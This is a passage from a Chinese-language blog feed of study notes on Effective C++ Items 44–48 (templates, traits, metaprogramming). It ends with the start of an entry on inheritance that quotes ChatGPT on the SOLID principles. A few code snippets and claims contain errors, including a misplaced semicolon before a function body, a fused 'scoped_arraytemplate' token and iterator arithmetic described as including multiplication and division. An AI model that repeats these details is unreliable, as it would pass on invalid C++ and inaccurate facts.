class="keyword">private</span> SquareMatrixBase&lt;T&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">using</span> SquareMatrixBase&lt;T&gt;::invert;   <span class="comment">// 避免隐藏基类版本的 invert；参见 Item 33</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">invert</span><span class="params">()</span> </span>&#123; <span class="keyword">this</span>-&gt;<span class="built_in">invert</span>(n); &#125;    </span><br><span class="line">&#125;;                                    <span class="comment">// 使用 &quot;this-&gt;&quot;,参见上一条</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我们是不是忘了什么，对呀！我们的数据在哪？</p><p>我们令SquareMartixBase贮存一个指向矩阵的指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrixBase</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">  <span class="built_in">SquareMatrixBase</span>(std::<span class="type">size_t</span> n, T *pMem)     <span class="comment">// 存储矩阵的大小和指向矩阵值的指针</span></span><br><span class="line">  : <span class="built_in">size</span>(n), <span class="built_in">pData</span>(pMem) &#123;&#125;                    <span class="comment">// 构造函数，初始化 size 和 pData</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setDataPtr</span><span class="params">(T *ptr)</span> </span>&#123; pData = ptr; &#125;     <span class="comment">// 重新分配 pData 的指针</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::<span class="type">size_t</span> size;                            <span class="comment">// 矩阵的大小</span></span><br><span class="line">  T *pData;                                    <span class="comment">// 指向矩阵值的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就是让 derived classes（派生类）决定如何分配内存。某些实现可能决定直接在 SquareMatrix object 内部存储矩阵数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, std::<span class="type">size_t</span> n&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrix</span>: <span class="keyword">private</span> SquareMatrixBase&lt;T&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">SquareMatrix</span>()                               <span class="comment">// 将矩阵大小和数据指针发送给基类</span></span><br><span class="line">  : <span class="built_in">SquareMatrixBase</span>&lt;T&gt;(n, data) &#123;&#125;            <span class="comment">// 构造函数，将矩阵大小和数据指针发送给基类</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  T data[n*n];                                 <span class="comment">// 存储矩阵值的数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们也可以将矩阵数据放入heap。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> boost::scoped_arraytemplate&lt;<span class="keyword">typename</span> T, std::<span class="type">size_t</span> n&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrix</span>: <span class="keyword">private</span> SquareMatrixBase&lt;T&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">SquareMatrix</span>()                               <span class="comment">// 将基类数据指针设置为 null，</span></span><br><span class="line">  : <span class="built_in">SquareMatrixBase</span>&lt;T&gt;(n, <span class="number">0</span>),                 <span class="comment">// 为矩阵值分配内存，</span></span><br><span class="line">    <span class="built_in">pData</span>(<span class="keyword">new</span> T[n*n])                          <span class="comment">// 保存一个指向内存的指针，</span></span><br><span class="line">  &#123; <span class="keyword">this</span>-&gt;<span class="built_in">setDataPtr</span>(pData.<span class="built_in">get</span>()); &#125;           <span class="comment">// 并将其副本传递给基类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  boost::scoped_array&lt;T&gt; pData;                <span class="comment">// 用于存储矩阵值的数组</span></span><br><span class="line">&#125;;  <span class="comment">// 有关scoped_array的信息，请参见条款13</span></span><br></pre></td></tr></table></figure><p>但是，我们为了减少代码膨胀这样写会有什么效果呢？</p><ul><li>在尺寸专属版中，尺寸是个编译期常量，因此可以由常量的广传达到最优化，包括把它们折进被生成指令中成为直接操作数。这在“与尺寸无关”的版本中是无法办到的。</li><li>从另一个角度看，不同大小的矩阵只拥有单一版本的invert, 可减少执行文件大小，也就因此降低程序的working set（内存页）大小，并强化指令高速缓存区内的引用集中化(locality of reference) 。这些都可能使程序执行得更快速，超越“尺寸专属版”invert 的最优化效果。</li><li>哪一个影响占主要地位？欲知答案，唯一的办法是两者都尝试并观察你的平台的行为以及面对代表性数据组时的行为。</li></ul><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><ul><li>Templates 生成多个classes 和多个函数，所以任何template 代码都不该与某个造成膨胀的template 参数产生相依关系。</li><li>因非类型模板参数(non-type template parameters) 而造成的代码膨胀，往往可消除，做法是以函数参数或class 成员变最替换template 参数。</li><li>因类型参数(type parameters) 而造成的代码膨胀，往往可降低，做法是让带有完全相同二进制表述(binary representations) 的具现类型(instantiation types)共享实现码。</li></ul><h3 id="45-Use-member-function-templates-to-accept-“all-compatible-types”"><a href="#45-Use-member-function-templates-to-accept-“all-compatible-types”" class="headerlink" title="45. Use member function templates to accept “all compatible types”"></a>45. Use member function templates to accept “all compatible types”</h3><p>我们知道，普通指针可以轻易进行隐式转换。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Top</span> &#123; ... &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Middle</span>: <span class="keyword">public</span> Top &#123; ... &#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bottom</span>: <span class="keyword">public</span> Middle &#123; ... &#125;;</span><br><span class="line">Top *pt1 = <span class="keyword">new</span> Middle;                   <span class="comment">// 将 Middle* 转换为 Top*</span></span><br><span class="line">Top *pt2 = <span class="keyword">new</span> Bottom;                   <span class="comment">// 将 Bottom* 转换为 Top*</span></span><br><span class="line"><span class="type">const</span> Top *pct2 = pt1;                   <span class="comment">// 将 Top* 转换为 const Top*</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们想在智能指针也实现此类操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 智能指针通常是通过内置指针初始化的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPtr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 智能指针通过内置指针初始化</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">SmartPtr</span><span class="params">(T *realPtr)</span></span>;</span><br><span class="line">  <span class="comment">// ... 省略了其他成员函数和成员变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SmartPtr&lt;Top&gt; pt1 =                 <span class="comment">// 将 SmartPtr&lt;Middle&gt; 转换为 SmartPtr&lt;Top&gt;</span></span><br><span class="line"><span class="built_in">SmartPtr</span>&lt;Middle&gt;(<span class="keyword">new</span> Middle);       <span class="comment">// 创建一个新的 SmartPtr&lt;Top&gt;</span></span><br><span class="line"></span><br><span class="line">SmartPtr&lt;Top&gt; pt2 =                 <span class="comment">// 将 SmartPtr&lt;Bottom&gt; 转换为 SmartPtr&lt;Top&gt;</span></span><br><span class="line"><span class="built_in">SmartPtr</span>&lt;Bottom&gt;(<span class="keyword">new</span> Bottom);       <span class="comment">// 创建一个新的 SmartPtr&lt;Top&gt;</span></span><br><span class="line"></span><br><span class="line">SmartPtr&lt;<span class="type">const</span> Top&gt; pct2 = pt1;     <span class="comment">// 将 SmartPtr&lt;Top&gt; 转换为 SmartPtr&lt;const Top&gt;</span></span><br><span class="line">                                    <span class="comment">// 把 pt1 作为 SmartPtr&lt;const Top&gt; 类型的智能指针</span></span><br></pre></td></tr></table></figure><p>我们需要让template知道转换的两个类型，因此我们需要的不是为SmartPtr写－个构造函数，而是为它写一个构造模板。这样的模板(templates) 是所谓member function templates （常简称为member templates) ，其作用是为class 生成函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPtr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;                       <span class="comment">// 成员模板</span></span><br><span class="line">  <span class="built_in">SmartPtr</span>(<span class="type">const</span> SmartPtr&lt;U&gt;&amp; other);        <span class="comment">// 用于实现“泛化的拷贝构造函数”</span></span><br><span class="line">  ...                                        <span class="comment">// 其他成员</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这一类构造函数根据对象u 创建对象t （例如根据SmartPtr<U> 创建一个SmartPtr<T>) ，而u 和v 的类型是同一个template 的不同具现体，有时我们称之为泛化(generalized) copy 构造函数。</p><p>接下来是使用成员初始化列表，只有当类型能被转换时才通过编译。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SmartPtr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> U&gt;</span></span><br><span class="line"><span class="function">  <span class="title">SmartPtr</span><span class="params">(<span class="type">const</span> SmartPtr&lt;U&gt;&amp; other)</span>         <span class="comment">// 使用其他智能指针的指针来初始化当前智能指针</span></span></span><br><span class="line"><span class="function">  : heldPtr(other.get()) &#123;</span> ... &#125;             <span class="comment">// 使用其他智能指针持有的指针来初始化当前智能指针持有的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="function">T* <span class="title">get</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> heldPtr; &#125;         <span class="comment">// 获取当前智能指针持有的指针</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:                                     <span class="comment">// 当前智能指针所持有的内置指针</span></span><br><span class="line">  T *heldPtr;                                <span class="comment">// 由 SmartPtr 所持有的内置指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终的效果就是 SmartPtr<T> 现在有一个 generalized copy constructor（泛型化拷贝构造函数），它只有在传入一个 compatible type（兼容类型）的参数时才能编译。</p><p>//TODO</p><h4 id="请记住-4"><a href="#请记住-4" class="headerlink" title="请记住"></a>请记住</h4><ul><li>请使用member function templates （成员函数模板）生成“可接受所有兼容类型”的函数。</li><li>如果你声明member templates 用千“泛化copy 构造”或“泛化assignment 操作“,你还是需要声明正常的copy 构造函数和copy assignment 操作符。</li></ul><h3 id="46-Define-non-member-functions-inside-templates-when-type-conversions-are-desired"><a href="#46-Define-non-member-functions-inside-templates-when-type-conversions-are-desired" class="headerlink" title="46. Define non-member functions inside templates when type conversions are desired."></a>46. Define non-member functions inside templates when type conversions are desired.</h3><p>本条款将<code>条款24</code>的Rational 和operator* 模板化了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rational</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Rational</span>(<span class="type">const</span> T&amp; numerator = <span class="number">0</span>,     <span class="comment">// 参见 Item 20，参数现在通过引用传递</span></span><br><span class="line">           <span class="type">const</span> T&amp; denominator = <span class="number">1</span>);  <span class="comment">// 参见 Item 20，参数现在通过引用传递</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">const</span> T <span class="title">numerator</span><span class="params">()</span> <span class="type">const</span></span>;           <span class="comment">// 参见 Item 28，返回值仍然通过值传递</span></span><br><span class="line">  <span class="function"><span class="type">const</span> T <span class="title">denominator</span><span class="params">()</span> <span class="type">const</span></span>;         <span class="comment">// 参见 Item 28，返回值仍然通过值传递</span></span><br><span class="line">  ...                                  <span class="comment">// 参见 Item 3，返回值为 const</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">const</span> Rational&lt;T&gt; <span class="keyword">operator</span>*(<span class="type">const</span> Rational&lt;T&gt;&amp; lhs,</span><br><span class="line">                            <span class="type">const</span> Rational&lt;T&gt;&amp; rhs)</span><br><span class="line">&#123; ... &#125;</span><br><span class="line"><span class="function">Rational&lt;<span class="type">int</span>&gt; <span class="title">oneHalf</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>)</span></span>;          </span><br><span class="line">Rational&lt;<span class="type">int</span>&gt; result = oneHalf * <span class="number">2</span>;   </span><br></pre></td></tr></table></figure><p>但是我们知道参数推导是个大问题，int类型2不会被推导为Rational，因为template在实参推导的过程中不将隐式类型转换函数考虑在内。</p><p>我们可以使用友元函数解决</p><p>template class 内的friend 声明式可以指涉某个特定函数。那意味class Rational<T>可以声明operator<em> 是它的一个friend 函数。Class templates 并不倚赖template 实参推导（后者只施行于function templates 身上），所以编译器总是能够在class Rational<T> 具现化时得知T 。因此，令Rational<T> class 声明适当的operator </em>为其friend 函数，可简化整个问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="keyword">class</span> <span class="title class_">Rational</span>;                 <span class="comment">// 声明 Rational 模板</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;                                    <span class="comment">// 声明辅助模板</span></span><br><span class="line"><span class="function"><span class="type">const</span> Rational&lt;T&gt; <span class="title">doMultiply</span><span class="params">(<span class="type">const</span> Rational&lt;T&gt;&amp; lhs,    <span class="comment">// 辅助函数模板</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="type">const</span> Rational&lt;T&gt;&amp; rhs)</span></span>;   </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Rational</span>&lt;T&gt;(lhs.<span class="built_in">numerator</span>() * rhs.<span class="built_in">numerator</span>(),   <span class="comment">// 返回两个有理数的乘积</span></span><br><span class="line">                     lhs.<span class="built_in">denominator</span>() * rhs.<span class="built_in">denominator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rational</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span></span><br><span class="line">  <span class="type">const</span> Rational&lt;T&gt; <span class="keyword">operator</span>*(<span class="type">const</span> Rational&lt;T&gt;&amp; lhs,    <span class="comment">// 声明友元函数</span></span><br><span class="line">                              <span class="type">const</span> Rational&lt;T&gt;&amp; rhs)   </span><br><span class="line">  &#123; <span class="keyword">return</span> <span class="built_in">doMultiply</span>(lhs, rhs); &#125;                      <span class="comment">// 调用辅助函数</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住-5"><a href="#请记住-5" class="headerlink" title="请记住"></a>请记住</h4><p>我们编写一个class template, 而它所提供之”与此template 相关的＂函数支持“所有参数之隐式类型转换”时，请将那些函数定义为“class template 内部的friend 函数”。</p><h3 id="47-Use-traits-classes-for-information-about-types"><a href="#47-Use-traits-classes-for-information-about-types" class="headerlink" title="47.Use traits classes for information about types."></a>47.Use traits classes for information about types.</h3><p>在 C++ 标准模板库（STL）中，迭代器（iterators）用于遍历容器中的元素。迭代器是 STL 的核心组件，它们根据不同的特性被分为多个类别。以下是一些主要的迭代器类别：</p><ol><li><strong>输入迭代器（Input Iterators）</strong>：<ul><li>只能向前遍历。</li><li>只能读取元素的值。</li><li>只能读取元素的值一次。</li><li>不能修改元素。</li><li>不能跳过元素。</li></ul></li><li><strong>输出迭代器（Output Iterators）</strong>：<ul><li>只能向前遍历。</li><li>只能写入元素的值。</li><li>只能写入元素的值一次。</li><li>不能读取元素。</li><li>不能跳过元素。</li></ul></li><li><strong>前向迭代器（Forward Iterators）</strong>：<ul><li>具有输入迭代器和输出迭代器的功能。</li><li>可以向前遍历。</li><li>可以读取元素的值。</li><li>可以修改元素的值。</li><li>不能跳过元素。</li></ul></li><li><strong>双向迭代器（Bidirectional Iterators）</strong>：<ul><li>具有前向迭代器的功能。</li><li>可以向前和向后遍历。</li><li>可以读取元素的值。</li><li>可以修改元素的值。</li><li>可以跳过元素。</li></ul></li><li><strong>随机访问迭代器（Random Access Iterators）</strong>：<ul><li>具有双向迭代器的功能。</li><li>可以进行任意顺序的访问。</li><li>可以读取元素的值。</li><li>可以修改元素的值。</li><li>可以跳过元素。</li><li>可以进行算术运算（加减乘除）。</li></ul></li></ol><p>我们想实现advance：将迭代器移动某个给定距离。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">advance</span><span class="params">(IterT&amp; iter, DistT d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (iter is a random access iterator) &#123;            <span class="comment">// 如果迭代器是随机访问迭代器</span></span><br><span class="line">     iter += d;                                      <span class="comment">// 使用迭代器的算术操作</span></span><br><span class="line">  &#125;                                                  <span class="comment">// 用于随机访问迭代器</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (d &gt;= <span class="number">0</span>) &#123; <span class="keyword">while</span> (d--) ++iter; &#125;              <span class="comment">// 对于其他迭代器类别，使用迭代调用 ++</span></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">while</span> (d++) --iter; &#125;                     <span class="comment">// 或 -- 操作</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种做法首先必须判断iter 是否为random access 迭代器，也就是说需要知道类型IterT 是否为random access 迭代器分类。</p><p>如果我们想对每个类型进行运行前判断，使用前面的方法需要进行多次判断,且类型判断发生在运行期而不是编译期。</p><p>我们可以通过<code>traits class</code>将此改为只进行一次判断并将类型判断转为编译期。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;              <span class="comment">// 用于随机访问迭代器的实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doAdvance</span><span class="params">(IterT&amp; iter, DistT d,                  <span class="comment">// 参数：迭代器、距离</span></span></span></span><br><span class="line"><span class="params"><span class="function">               std::random_access_iterator_tag)</span>       <span class="comment">// 迭代器标签</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  iter += d;                                           <span class="comment">// 使用迭代器的算术操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;              <span class="comment">// 用于双向迭代器的实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doAdvance</span><span class="params">(IterT&amp; iter, DistT d,                  <span class="comment">// 参数：迭代器、距离</span></span></span></span><br><span class="line"><span class="params"><span class="function">               std::bidirectional_iterator_tag)</span>       <span class="comment">// 迭代器标签</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (d &gt;= <span class="number">0</span>) &#123; <span class="keyword">while</span> (d--) ++iter; &#125;                 <span class="comment">// 正向移动</span></span><br><span class="line">  <span class="keyword">else</span> &#123; <span class="keyword">while</span> (d++) --iter; &#125;                        <span class="comment">// 逆向移动</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;              <span class="comment">// 用于输入迭代器的实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doAdvance</span><span class="params">(IterT&amp; iter, DistT d,                  <span class="comment">// 参数：迭代器、距离</span></span></span></span><br><span class="line"><span class="params"><span class="function">               std::input_iterator_tag)</span>               <span class="comment">// 迭代器标签</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (d &lt; <span class="number">0</span> ) &#123;                                       <span class="comment">// 如果距离为负数</span></span><br><span class="line">     <span class="keyword">throw</span> std::<span class="built_in">out_of_range</span>(<span class="string">&quot;Negative distance&quot;</span>);    <span class="comment">// 抛出异常</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (d--) ++iter;                                 <span class="comment">// 正向移动</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> IterT, <span class="keyword">typename</span> DistT&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">advance</span><span class="params">(IterT&amp; iter, DistT d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">doAdvance</span>(                                              </span><br><span class="line">    iter, d,                                              </span><br><span class="line">    <span class="keyword">typename</span>                                            </span><br><span class="line">      std::iterator_traits&lt;IterT&gt;::<span class="built_in">iterator_category</span>()    </span><br><span class="line">  );        <span class="comment">//调用不同版本的iterator                                              </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们可以总结如何使用一个<code>traits class</code>了：</p><ul><li>建立一组重载函数（身份像劳工）或函数模板（例如doAdvance) ，彼此间的差异只在于各自的traits 参数。令每个函数实现码与其接受之traits 信息相应和。</li><li>建立一个控制函数（身份像工头）或函数模板（例如advance) ，它调用上述那些“劳工函数”并传递traits class 所提供的信息。</li></ul><h4 id="请记住-6"><a href="#请记住-6" class="headerlink" title="请记住"></a>请记住</h4><ul><li>Traits classes 使得“类型相关信息”在编译期可用。它们以templates 和“templates特化”完成实现。</li><li>整合重载技术(overloading) 后， traits classes 有可能在编译期对类型执行if… else 测试。</li></ul><h3 id="48-Be-aware-of-template-metaprogramming"><a href="#48-Be-aware-of-template-metaprogramming" class="headerlink" title="48. Be aware of template metaprogramming."></a>48. Be aware of template metaprogramming.</h3><p>Template metaprogramming （TMP, 模板元编程）是编写template-based C+＋程序并执行于编译期的过程。花一分钟想想这个：所谓template metaprogram （模板元程序）是以C+＋写成、执行于C+＋编译器内的程序。一旦TMP 程序结束执行，其输出，也就是从templates 具现出来的若干C+＋源码，便会一如往常地被编译。</p><p>//TODO</p><h4 id="请记住-7"><a href="#请记住-7" class="headerlink" title="请记住"></a>请记住</h4><ul><li>Template metaprogramming (TMP, 模板元编程）可将<code>工作由运行期移往编译期，因而得以实现早期错误侦测和更高的执行效率</code>。</li><li>TMP 可被用来生成“基于政策选择组合” (based on combinations of policy choices) 的客户定制代码，也可用来避免生成对某些特殊类型并不适合的代码。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x6</title>
      <link href="/2024/04/21/C&amp;C++/Effective%20Cpp0x6/"/>
      <url>/2024/04/21/C&amp;C++/Effective%20Cpp0x6/</url>
      
        <content type="html"><![CDATA[<h1 id="Inheritance-and-Object-Oriented-Design"><a href="#Inheritance-and-Object-Oriented-Design" class="headerlink" title="Inheritance and Object-Oriented Design"></a>Inheritance and Object-Oriented Design</h1><p>[toc]</p><blockquote><p>我：请问什么是面向对象原则</p><p>ChatGPT：SOLID 是面向对象设计中的五个基本设计原则的首字母缩写，它们是：</p><ol><li><strong>单一职责原则（Single Responsibility Principle，SRP）</strong>： 每个类或模块应该只有一个改变的理由，即一个类应该只负责一个职责。这个原则指导我们将系统分解为小而独立的部分，每个部分都有自己的职责，使得代码更加清晰、可维护和可重用。</li><li><strong>开放-封闭原则（Open/Closed Principle，OCP）</strong>： 软件实体（类、模块、函数等）应该对扩展开放，对修改封闭。这意味着当需要改变系统的行为时，不应该修改已有的代码，而是应该通过扩展现有的代码来实现新的行为。这个原则鼓励使用抽象和多态性来实现系统的灵活性和可扩展性。</li><li><strong>里氏替换原则（Liskov Substitution Principle，LSP）</strong>： 已有的对象实例可以被它的子类实例替换，而程序的行为仍然保持一致。这个原则强调子类应该符合父类的契约，保持对父类的透明性，同时可以通过子类扩展父类的行为。</li><li><strong>接口隔离原则（Interface Segregation Principle，ISP）</strong>： 客户端不应该依赖于它不需要使用的接口。这个原则指导我们设计精简的接口，将大接口拆分为多个小接口，使得客户端只需要依赖于它们真正需要的接口，避免了不必要的依赖关系，提高了系统的灵活性和可维护性。</li><li><strong>依赖反转原则（Dependency Inversion Principle，DIP）</strong>： 